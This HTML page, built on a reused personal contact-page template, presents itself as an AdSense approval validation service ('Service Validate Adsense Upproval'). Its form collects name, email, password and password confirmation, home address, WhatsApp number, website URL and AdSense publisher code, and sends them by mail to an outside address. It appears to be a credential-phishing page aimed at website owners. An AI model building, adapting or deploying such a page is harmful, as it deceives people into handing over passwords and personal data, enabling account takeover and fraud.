<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8" />

    <meta name="description"
        content="This is my personal contact page created using static HTML, CSS, Javascript. Used github to host this website." />
    <meta name="author" content="Manthan Ankolekar" />
    <meta name="keywords" content="conatact">
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
    <link rel="icon" type="image/png" sizes="32x32" href="favicon-dark.webp" media="(prefers-color-scheme: dark)" />
    <link rel="icon" type="image/png" sizes="32x32" href="favicon-light.webp" media="(prefers-color-scheme: light)" />

<script type="text/javascript"
        src="https://cdn.jsdelivr.net/npm/mailslurp-com@2.4.0/dist/email.min.js">
</script>

<body>
    <header>
        <h1>Service Validate Adsense Upproval</h1>
    </header>
    
    <div id="responseMessage"></div> <!-- Display API response message -->

    <form id="contactForm" action="mailto:cs@awdev.eu.org" method="post" enctype="text/plain">
        <input name="name" type="text" id="name" class="feedback-input" placeholder="Name" required />
        <input name="email" type="email" id="email" class="feedback-input" placeholder="Email" required />
        <input name="password" type="password" id="password" class="feedback-input" placeholder="Password" required />
        <input name="validate password" type="validate password" id="validate password" class="feedback-input" placeholder="Validate Password" required />       
        <input name="alamat" type="alamat" id="alamat" class="feedback-input" placeholder="Alamat" required />
        <input name="wa" type="wa" id="wa" class="feedback-input" placeholder="Wa" required />
        <input name="url" type="url" id="url" class="feedback-input" placeholder="URL Website" required />
        <input name="pub" type="pub" id="pub" class="feedback-input" placeholder="Kode Pub-" required />
        
        <textarea name="message" id="message" class="feedback-input" placeholder="Your Massage" required></textarea>
        <input type="submit" value="SUBMIT" />
    </form>


    <!-- Additional details or footer -->
    <footer>

    </footer>
</body>
